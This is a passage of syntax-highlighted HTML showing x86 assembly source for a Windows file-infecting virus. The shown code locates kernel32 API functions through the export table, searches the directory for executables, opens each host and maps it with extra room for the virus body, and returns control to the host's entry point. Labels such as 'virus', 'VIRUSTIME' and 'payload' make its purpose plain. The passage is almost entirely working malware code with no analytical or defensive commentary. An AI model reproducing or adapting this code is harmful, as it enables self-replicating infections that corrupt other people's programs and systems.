          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">shit4</span><span class="sc0">                                  </span><span class="sc1">;if not equal jump</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;is exact?                       </span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">LetsGO</span><span class="sc0">                                  </span><span class="sc1">;if so were game</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">shit2</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">shit4</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumberNames</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NamingIndex</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NamingIndex</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">shit</span><span class="sc0">
</span><span class="sc5">LetsGO</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AddressOfNameOrdinals</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AddressofFunctions</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AGetProcAddress</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">popad</span><span class="sc0"> 




</span><span class="sc5">GOGETAPI</span><span class="sc4">:</span><span class="sc0">

    
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ACreateFileA</span><span class="sc4">]</span><span class="sc0">
          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ACreateFileAA</span><span class="sc4">]</span><span class="sc0"> 
          
</span><span class="sc5">apisearch</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          
          </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">Incrabyte</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Incrabyte</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">apisearch</span><span class="sc0">




 </span><span class="sc5">GetMsgBoxModule</span><span class="sc4">:</span><span class="sc0">
          
    
           
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">userdll</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ALoadLibraryA</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">userbase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AMsgBox</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">userbase</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          
          
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AMsgBoxA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
         


         

</span><span class="sc5">terminater</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GENONE</span><span class="sc0">         
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuffhost2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuffhost</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hosteip</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">imagebase2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GENONE</span><span class="sc4">:</span><span class="sc0">
        
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AExitProcessA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">   
 
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exest</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AFindFirstFileAA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dirchange</span><span class="sc0">
          
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">VIRUSTIME</span><span class="sc0">
</span><span class="sc5">FINDNEXTFILE</span><span class="sc4">:</span><span class="sc0">
      
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AFindNextFileAA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">VIRUSTIME</span><span class="sc0"> 
</span><span class="sc5">dirchange</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newdir</span><span class="sc4">]</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir3</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AGetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir2</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir3</span><span class="sc4">]</span><span class="sc0">
           
</span><span class="sc5">compared</span><span class="sc4">:</span><span class="sc0">
         
         </span><span class="sc6">cmpsb</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">      
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                                       
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">checkesi</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compared</span><span class="sc0">
</span><span class="sc5">checkesi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">                                 
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">                    
                                          
                                        
         
         
</span><span class="sc5">VIRUSTIME</span><span class="sc4">:</span><span class="sc0">         
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.FileSizeLow</span><span class="sc4">]</span><span class="sc0">
         
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewHostSize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virussize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileNameOffset</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ACreateFileAA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FINDNEXTFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AGetFileSizeA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewHostSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ACreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">closeshop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AMapViewOfFileA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">closemap</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddy</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">PE_SEE</span><span class="sc4">:</span><span class="sc0">
